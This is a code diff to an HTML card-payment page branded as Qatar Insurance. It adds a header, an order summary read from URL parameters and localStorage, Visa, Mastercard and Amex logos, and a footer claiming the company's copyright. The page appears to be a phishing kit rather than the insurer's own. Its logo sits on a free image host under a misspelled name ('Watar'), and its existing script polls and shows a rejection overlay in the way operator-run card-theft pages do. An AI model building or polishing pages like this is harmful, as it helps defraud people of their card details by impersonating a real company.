@@ -39,8 +39,51 @@
     body { background: var(--card-bg); padding: 0; align-items: flex-start; }
     .screen { box-shadow: none; border-radius: 0; min-height: 100vh; padding: 16px 20px 0 20px; }
   }
-  .logo-wrap { display: flex; justify-content: center; margin-bottom: 24px; }
-  .logo-wrap img { max-width: 220px; width: 100%; height: auto; }
+  .page-header {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding-bottom: 20px;
+    margin-bottom: 22px;
+    border-bottom: 1px solid var(--border);
+  }
+  .page-header .logo-wrap { display: flex; justify-content: center; margin-bottom: 14px; }
+  .page-header .logo-wrap img { max-width: 200px; width: 100%; height: auto; }
+  .page-title {
+    font-size: 20px;
+    font-weight: 700;
+    color: var(--green);
+    margin: 0;
+    text-align: center;
+    letter-spacing: 0.2px;
+  }
+  .page-subtitle {
+    font-size: 13px;
+    color: var(--muted);
+    margin: 6px 0 0;
+    text-align: center;
+  }
+  .summary-card {
+    border: 1px solid var(--border);
+    border-radius: 14px;
+    padding: 4px 16px;
+    margin-bottom: 22px;
+    background: #fbfcfd;
+  }
+  .summary-row {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 12px 0;
+    border-bottom: 1px solid #eef1f3;
+    font-size: 14px;
+    gap: 12px;
+  }
+  .summary-row:last-child { border-bottom: none; }
+  .summary-row .sl { color: var(--muted); flex-shrink: 0; }
+  .summary-row .sv { color: var(--text-dark); font-weight: 600; text-align: right; word-break: break-word; }
+  .summary-row.total { font-size: 16px; }
+  .summary-row.total .sv { color: var(--green); font-weight: 700; }
   .secure-icon {
     width: 50px; height: 50px;
     background-color: rgba(26, 107, 60, 0.05);
@@ -84,6 +127,33 @@
   .btn-submit:disabled { background-color: #cccccc; cursor: not-allowed; box-shadow: none; }
   .error-msg { color: #c0392b; font-size: 13px; margin-top: 12px; display: none; text-align: center; }
 
+  .pay-brands {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 14px;
+    margin-top: 18px;
+    padding-top: 16px;
+    border-top: 1px solid var(--border);
+  }
+  .pay-brands img { height: 26px; width: auto; display: block; opacity: 0.9; }
+  .pay-brands-label {
+    font-size: 12px;
+    color: var(--muted);
+    text-align: center;
+    margin: 0 0 10px;
+  }
+
+  .page-footer {
+    margin-top: 26px;
+    padding-top: 18px;
+    border-top: 1px solid var(--border);
+    text-align: center;
+    font-size: 12px;
+    color: var(--muted);
+    line-height: 1.7;
+  }
+
   .overlay {
     position: fixed; inset: 0;
     background: rgba(255, 255, 255, 0.95);
@@ -116,8 +186,20 @@
 <body>
 
   <div class="screen">
-    <div class="logo-wrap">
-      <img src="https://i.ibb.co/kVxnFRHX/Watar-Insurance-Company-01.png" alt="Qatar Insurance" />
+    <div class="page-header">
+      <div class="logo-wrap">
+        <img src="https://i.ibb.co/kVxnFRHX/Watar-Insurance-Company-01.png" alt="Qatar Insurance" />
+      </div>
+      <h1 class="page-title">Payment Summary</h1>
+      <p class="page-subtitle">Please review your order details, then enter your card information to complete the payment.</p>
+    </div>
+
+    <div class="summary-card" id="summaryCard">
+      <div class="summary-row"><span class="sl">Insurance Type</span><span class="sv" id="sum-plan">—</span></div>
+      <div class="summary-row"><span class="sl">Full Name</span><span class="sv" id="sum-name">—</span></div>
+      <div class="summary-row"><span class="sl">Plate Number</span><span class="sv" id="sum-plate">—</span></div>
+      <div class="summary-row"><span class="sl">Insurance Start Date</span><span class="sv" id="sum-start">—</span></div>
+      <div class="summary-row total"><span class="sl">Total</span><span class="sv" id="sum-total">—</span></div>
     </div>
 
     <div class="secure-icon">
@@ -150,6 +232,17 @@
       </div>
       <button class="btn-submit" id="btnSubmit" type="button">Confirm Payment</button>
       <div class="error-msg" id="errorMsg">An error occurred while sending data, please try again.</div>
+
+      <p class="pay-brands-label">Accepted payment methods</p>
+      <div class="pay-brands">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/1280px-Visa_Inc._logo.svg.png" alt="Visa">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" alt="MasterCard">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/30/American_Express_logo.svg/1280px-American_Express_logo.svg.png" alt="American Express">
+      </div>
+    </div>
+
+    <div class="page-footer">
+      All rights reserved to Qatar Insurance Company - شركة قطر للتأمين
     </div>
   </div>
 
@@ -181,6 +274,27 @@
     var rejectOverlay = document.getElementById('rejectOverlay');
     var errorMsg = document.getElementById('errorMsg');
     var pollTimer = null;
+
+    // ---- Populate the payment summary from the previous page ----
+    (function fillSummary() {
+      var params = new URLSearchParams(location.search);
+      function get(key) {
+        var v = params.get(key);
+        if (v) return v;
+        try { return localStorage.getItem('qic_' + key) || ''; } catch (e) { return ''; }
+      }
+      var plan = get('planName');
+      var name = get('name');
+      var plate = get('plate_no') || get('plate');
+      var start = get('start_date');
+      var price = get('price');
+
+      document.getElementById('sum-plan').textContent = plan || '—';
+      document.getElementById('sum-name').textContent = name || '—';
+      document.getElementById('sum-plate').textContent = plate || '—';
+      document.getElementById('sum-start').textContent = start || '—';
+      document.getElementById('sum-total').textContent = price ? (parseInt(price, 10) + ' QAR') : '—';
+    })();
 
     function stopPoll() { clearInterval(pollTimer); pollTimer = null; }
 
